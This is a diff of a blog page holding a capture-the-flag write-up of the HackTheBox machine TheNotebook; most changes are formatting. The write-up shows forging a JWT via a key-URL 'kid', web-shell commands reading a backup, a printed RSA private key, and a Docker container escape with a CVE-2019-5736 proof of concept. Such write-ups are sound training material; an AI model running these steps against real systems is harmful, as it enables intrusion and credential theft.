@@ -1,169 +1,123 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: TheNotebook publish on Mars 6, 2021 by mostwanted002. This box is rated as a medium machine. It implies a JWT token, some PHP files and a docker exploit." />
-<meta name="keywords" content="security, boot2root, HTB, JWT, docker, CVE-2019-5736, CVE">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: The Notebook"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: TheNotebook publish on Mars 6, 2021 by mostwanted002. This box is rated as a medium machine. It implies a JWT token, some PHP files and a docker exploit."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2021/08/htb-the-notebook.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2021-08-01 10:45:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="JWT"/>
-  <meta property="article:tag" content="docker"/>
-  <meta property="article:tag" content="CVE-2019-5736"/>
-  <meta property="article:tag" content="CVE"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: The Notebook</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: TheNotebook publish on Mars 6, 2021 by mostwanted002. This box is rated as a medium machine. It implies a JWT token, some PHP files and a docker exploit." name="description"/>
+<meta content="security, boot2root, HTB, JWT, docker, CVE-2019-5736, CVE" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: The Notebook" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: TheNotebook publish on Mars 6, 2021 by mostwanted002. This box is rated as a medium machine. It implies a JWT token, some PHP files and a docker exploit." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2021/08/htb-the-notebook.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2021-08-01 10:45:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="JWT" property="article:tag"/>
+<meta content="docker" property="article:tag"/>
+<meta content="CVE-2019-5736" property="article:tag"/>
+<meta content="CVE" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: The Notebook</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-the-notebook">HTB: The Notebook</h1>
-    <p>
+<header>
+<h1 id="htb-the-notebook">HTB: The Notebook</h1>
+<p>
       Posted on 01 Aug 2021 in <a href="../../category/security.html">security</a>
 
-        &#8226; 4 min read
+        • 4 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2021.08/thenotebook_card.png" alt="The Notebook Card" width="262"></p>
+</header>
+<div>
+<p><img alt="The Notebook Card" class="align-left" src="/media/2021.08/thenotebook_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/320">TheNotebook</a> publish on
 Mars 6, 2021 by
 <a href="https://www.hackthebox.com/home/users/profile/120514">mostwanted002</a>.
 This box is rated as a medium machine. It implies a JWT token, some PHP files
 and a docker exploit.</p>
-
-
 <h1>Foothold</h1>
 <h2>Recon</h2>
 <p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are
@@ -177,7 +131,6 @@ PORT      STATE    SERVICE VERSION
 10010/tcp filtered rxapi
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre></div>
-
 <h1>Web</h1>
 <p>The website is an application to take notes. We can self register a user. We notice that:</p>
 <ul>
@@ -187,12 +140,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </ul>
 <p>Our <a href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a">JWT token</a> has the following values:</p>
 <div class="highlight"><pre><span></span><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9
-{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;,&quot;kid&quot;:&quot;http://localhost:7070/privKey.key&quot;}
+{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}
 
 eyJ1c2VybmFtZSI6InJyIiwiZW1haWwiOiJyQHIuY29tIiwiYWRtaW5fY2FwIjowfQ
-{&quot;username&quot;:&quot;rr&quot;,&quot;email&quot;:&quot;r@r.com&quot;,&quot;admin_cap&quot;:0}
+{"username":"rr","email":"r@r.com","admin_cap":0}
 </code></pre></div>
-
 <p>A few interesting point about this JWT token:</p>
 <ol>
 <li>the kid (Key ID) in the header is an URL</li>
@@ -204,7 +156,6 @@ address and port and got a ping on it (with a 404).</p>
 and we make it available using the python server.</p>
 <div class="highlight"><pre><span></span><code>ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
 </code></pre></div>
-
 <p>We use <a href="https://jwt.io/">https://jwt.io/</a> to generate a new token with the
 <code>admin_cap</code> parameter to <code>1</code> and sign it using our private key.</p>
 <p>By replacing our token with the new one we can now access the <a href="http://10.129.82.59/admin">admin panel</a>
@@ -220,7 +171,6 @@ apt.extended_states.1.gz
 apt.extended_states.2.gz
 home.tar.gz
 </code></pre></div>
-
 <p>We copy the archive to our parent directory and extract it.</p>
 <div class="highlight"><pre><span></span><code>cmd=cp%20../../backups/home.tar.gz%20../
 cmd=tar%20xvf%20../home.tar.gz%20-C%20../
@@ -238,7 +188,6 @@ home/noah/.ssh/id_rsa
 home/noah/.ssh/authorized_keys
 home/noah/.ssh/id_rsa.pub
 </code></pre></div>
-
 <p>We can then get the "noah" user private SSH key.</p>
 <div class="highlight"><pre><span></span><code>cmd=cat%20../home/noah/.ssh/id_rsa
 -----BEGIN RSA PRIVATE KEY-----
@@ -269,7 +218,6 @@ JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
 Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
 -----END RSA PRIVATE KEY-----
 </code></pre></div>
-
 <p>We use it to connect on the box as "noah" and get the user flag.</p>
 <div class="highlight"><pre><span></span><code>└─$ ssh noah@10.129.82.59 -i id_rsa
 &lt;SNIP&gt;
@@ -278,7 +226,6 @@ uid=1000(noah) gid=1000(noah) groups=1000(noah)
 noah@thenotebook:~$ cat user.txt
 4a22cbbbecb491a77b6659fdf00183ba
 </code></pre></div>
-
 <h1>root</h1>
 <h2>Docker</h2>
 <p>We enumerate our permission on the box.</p>
@@ -289,7 +236,6 @@ Matching Defaults entries for noah on thenotebook:
 User noah may run the following commands on thenotebook:
     (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
 </code></pre></div>
-
 <p>Our user can execute command on the "webapp-dev01" docker machine. We can use
 <code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash</code> to get a bash shell
 inside the docker.</p>
@@ -301,7 +247,7 @@ vulnerable to a container escape exploit.</p>
                       ##         .
                 ## ## ##        ==
             ## ## ## ##       ===
-        /&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;\___/ ===
+        /"""""""""""""""""\___/ ===
     ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/
           \    \         __/
@@ -364,7 +310,6 @@ runC binary
 ==================================( Enumerating Containers )==================================
 ==============================================================================================
 </code></pre></div>
-
 <p>A quick Google search return us a simple <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">CVE-2019-5736 PoC</a>
 written in Golang.</p>
 <p>We modify the <code>main.go</code> file with the payload <code>var payload = "#!/bin/bash \n cat /root/root.txt &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow"</code>
@@ -385,78 +330,55 @@ root@893ea5c84398:/tmp# ./main
 [+] Successfully got write handle &amp;{0xc0004078c0}
 root@893ea5c84398:/tmp#
 </code></pre></div>
-
 <p>On another terminal on the "thenotebook" host we run the following command (our exploit binary rewrite
 <code>/bin/sh</code> so we need to call that command) and get the private flag.</p>
 <div class="highlight"><pre><span></span><code>noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
-No help topic for &#39;/bin/sh&#39;
+No help topic for '/bin/sh'
 noah@thenotebook:~$ ls /tmp/
 home  shadow  systemd-private-0c3e87bdcb724a669778cfa72c5b4017-systemd-timesyncd.service-vsSHAh  tmux-1000  vmware-root_611-3980232955
 noah@thenotebook:~$ cat /tmp/shadow
 e16458a8ec21a020bb382e56d8f0ed42
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>An interesting box as working with JWT token is more and more common. The docker
 exploit is simple to use. A nice box overall.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/jwt.html">JWT</a>
-      <a href="../../tag/docker.html">docker</a>
-      <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
-      <a href="../../tag/cve.html">CVE</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2021/07/htb-armageddon.html" title="HTB: Armageddon">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2021/08/htb-love.html" title="HTB: Love">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/jwt.html">JWT</a>
+<a href="../../tag/docker.html">docker</a>
+<a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+<a href="../../tag/cve.html">CVE</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2021/07/htb-armageddon.html" title="HTB: Armageddon">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2021/08/htb-love.html" title="HTB: Love">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -467,6 +389,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
